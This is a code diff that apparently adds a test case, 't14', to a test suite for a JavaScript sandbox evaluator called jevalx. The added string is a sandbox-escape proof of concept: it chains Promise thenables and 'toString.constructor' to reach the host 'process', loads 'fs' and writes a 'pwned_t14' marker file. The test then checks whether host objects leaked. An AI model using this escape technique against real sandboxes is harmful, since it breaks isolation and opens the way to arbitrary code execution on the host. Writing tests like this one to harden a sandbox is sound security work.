@@ -1793,6 +1793,25 @@ Promise.prototype.then=function(r,e){return old.call(this,v=>{try{r(v)}catch(e){
      }
      console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
   },
+t14:async function(){ let case_id = arguments.callee.name; var code=`
+o={};
+w=f=>toString.call.bind(f.call,f,0);
+d=f=>Promise.resolve().then(w(f));
+t=r=>{
+	o.then=0;
+	r(o);
+	d(()=>d(()=>toString.constructor('return process')().mainModule.require("fs").writeFileSync("pwned_t14","")));
+};
+d(()=>d(()=>{o.then=w(t)}));
+o
+`
+     try{
+       console.log(`${case_id} result(raw)=`,await jevalx(code,{dumptree:require('./dumptree')},timeout=666,json_output=false));
+     }catch(ex){
+       console.log(`${case_id} ex=`,ex);
+     }
+     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
+  },
 
 
 
